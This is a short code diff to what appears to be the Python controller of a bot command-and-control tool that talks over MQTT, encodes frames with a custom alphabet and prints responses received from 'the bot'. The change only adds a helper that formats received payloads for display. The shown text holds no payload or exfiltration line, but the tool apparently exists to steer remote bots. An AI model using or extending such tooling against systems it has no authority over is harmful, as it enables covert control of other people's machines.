@@ -46,6 +46,12 @@ class Controller:
 
 '''
 
+def pretty_print_payload(payload: bytes):
+    try:
+        text = payload.decode()
+        print(f"\tPayload: {text}")
+    except: 
+        print(f"\tPayload: {payload}")
 class AlphabetEncoder:
     def __init__(self, standard_alphabet: str=STANDARD_ALPHABET, custom_alphabet: str=CUSTOM_ALPHABET):
         self.standard_alphabet = standard_alphabet
@@ -109,6 +115,7 @@ class Publisher():
             print(f"(Info)\t Successfully published!")
         self.client.loop_forever()
     
+
     def on_message(self, client, userdata, message):
         try:
             decoded_m = self.ph.decode_frame(message.payload)
@@ -117,7 +124,9 @@ class Publisher():
                 response_idx = list(RESP_TYPES.values()).index(cmd_type)
                 response = list(RESP_TYPES.keys())[response_idx]
                 print("(Info)\t Received response from the bot!")
-                print(f"\t Response: {response}\n\t Payload: {payload.decode()}")
+                # print(f"\t Response: {response}\n\t Payload: {payload}")
+                print(f"\t Response: {response}")
+                pretty_print_payload(payload)
 
                 # disconnect
                 self.client.loop_stop()
